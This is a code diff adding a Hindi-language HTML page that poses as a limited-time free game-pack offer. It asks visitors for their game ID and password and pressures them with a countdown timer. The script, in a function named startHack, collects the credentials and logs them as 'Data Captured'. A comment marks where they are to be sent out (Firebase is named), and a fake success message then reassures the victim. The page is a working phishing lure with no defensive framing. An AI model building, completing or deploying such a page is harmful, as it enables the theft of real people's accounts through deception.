@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Special Offer - Limited Time</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            background-color: #1a1a1a; 
+            color: white;
+            margin: 0;
+            padding: 20px;
+        }
+        .container { 
+            background: #2d2d2d; 
+            max-width: 350px; 
+            margin: 30px auto; 
+            padding: 25px; 
+            border-radius: 15px; 
+            box-shadow: 0px 0px 20px rgba(0,255,0,0.2);
+            border: 1px solid #444;
+        }
+        h2 { color: #00ff00; }
+        .offer-box {
+            background: #3d3d3d;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 5px solid #00ff00;
+        }
+        input { 
+            width: 90%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            border: none; 
+            border-radius: 5px; 
+            background: #444;
+            color: white;
+        }
+        button { 
+            background: #00ff00; 
+            color: black; 
+            border: none; 
+            padding: 12px; 
+            cursor: pointer; 
+            width: 95%; 
+            border-radius: 5px; 
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover { background: #00cc00; }
+        #timer-box { 
+            margin-top: 20px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        #timer { 
+            color: #ff4444; 
+            font-weight: bold; 
+            font-size: 24px; 
+            display: block;
+        }
+        #loading-msg {
+            display: none;
+            color: #00ff00;
+            margin-top: 15px;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>धमाका ऑफर! 🎁</h2>
+    <div class="offer-box">
+        <p>अपना ID और पासवर्ड डालकर तुरंत फ्री पैक क्लेम करें।</p>
+    </div>
+    
+    <input type="text" placeholder="Username / Game ID" id="username" required>
+    <input type="password" placeholder="Password" id="password" required>
+    
+    <button onclick="startHack()">CLAIM NOW</button>
+
+    <div id="loading-msg">प्रक्रिया शुरू हो रही है... कृपया प्रतीक्षा करें...</div>
+
+    <div id="timer-box">
+        यह ऑफर खत्म होने में समय बचा है:
+        <span id="timer">05:00</span>
+    </div>
+</div>
+
+<script>
+    // उलटी गिनती (Timer) - 5 मिनट
+    let seconds = 300;
+    const timerDisplay = document.getElementById('timer');
+
+    const countdown = setInterval(() => {
+        let mins = Math.floor(seconds / 60);
+        let secs = seconds % 60;
+        timerDisplay.innerHTML = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        
+        if (seconds <= 0) {
+            clearInterval(countdown);
+            timerDisplay.innerHTML = "OFFER EXPIRED";
+        } else {
+            seconds--;
+        }
+    }, 1000);
+
+    // बटन क्लिक फंक्शन
+    function startHack() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        if (user === "" || pass === "") {
+            alert("कृपया सभी जानकारी भरें!");
+            return;
+        }
+
+        document.getElementById('loading-msg').style.display = "block";
+        
+        // यहाँ से डेटा भेजने का लॉजिक लगेगा (Firebase आदि)
+        console.log("Data Captured:", user, pass);
+
+        setTimeout(() => {
+            alert("बधाई हो! आपके अकाउंट में पैक 10 मिनट के अंदर भेज दिया जाएगा।");
+            document.getElementById('loading-msg').innerHTML = "सफलतापूर्वक सबमिट किया गया!";
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
